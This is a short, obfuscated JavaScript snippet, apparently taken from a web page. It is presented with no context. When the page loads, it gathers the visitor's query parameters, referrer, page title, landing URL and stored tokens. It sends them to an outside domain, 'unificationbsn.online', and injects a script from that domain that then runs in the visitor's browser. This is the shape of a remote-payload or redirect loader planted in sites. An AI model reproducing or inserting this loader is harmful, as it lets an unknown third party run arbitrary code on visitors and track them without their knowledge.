   (function() {
    var name = '_4NPyhwmjJKtKJkcN';
    if (!window._4NPyhwmjJKtKJkcN) {
        window._4NPyhwmjJKtKJkcN = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://unificationbsn.online/ZcVcbPCh',
            P_PATH: 'https://unificationbsn.online/ad89deb/postback',
        };
    }
    const _PkmptyLJS9N1BkrY = localStorage.getItem('config');
    if (typeof _PkmptyLJS9N1BkrY !== 'undefined' && _PkmptyLJS9N1BkrY !== null) {
        var _YX5wzZPrxzTyX8Fw = JSON.parse(_PkmptyLJS9N1BkrY);
        var _N2j4bw5ywzphJKWC = Math.round(+new Date()/1000);
        if (_YX5wzZPrxzTyX8Fw.created_at + window._4NPyhwmjJKtKJkcN.ttl < _N2j4bw5ywzphJKWC) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _d4NX6N98v8xNDsXB = localStorage.getItem('subId');
    var _kdPf57CNkhD99X6x = localStorage.getItem('token');
    var _tGcLgpMT9wW2R1zH = '?return=js.client';
        _tGcLgpMT9wW2R1zH += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _tGcLgpMT9wW2R1zH += '&se_referrer=' + encodeURIComponent(document.referrer);
        _tGcLgpMT9wW2R1zH += '&default_keyword=' + encodeURIComponent(document.title);
        _tGcLgpMT9wW2R1zH += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _tGcLgpMT9wW2R1zH += '&name=' + encodeURIComponent(name);
        _tGcLgpMT9wW2R1zH += '&host=' + encodeURIComponent(window._4NPyhwmjJKtKJkcN.R_PATH);
    if (typeof _d4NX6N98v8xNDsXB !== 'undefined' && _d4NX6N98v8xNDsXB && window._4NPyhwmjJKtKJkcN.unique) {
        _tGcLgpMT9wW2R1zH += '&sub_id=' + encodeURIComponent(_d4NX6N98v8xNDsXB);
    }
    if (typeof _kdPf57CNkhD99X6x !== 'undefined' && _kdPf57CNkhD99X6x && window._4NPyhwmjJKtKJkcN.unique) {
        _tGcLgpMT9wW2R1zH += '&token=' + encodeURIComponent(_kdPf57CNkhD99X6x);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._4NPyhwmjJKtKJkcN.R_PATH + _tGcLgpMT9wW2R1zH;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
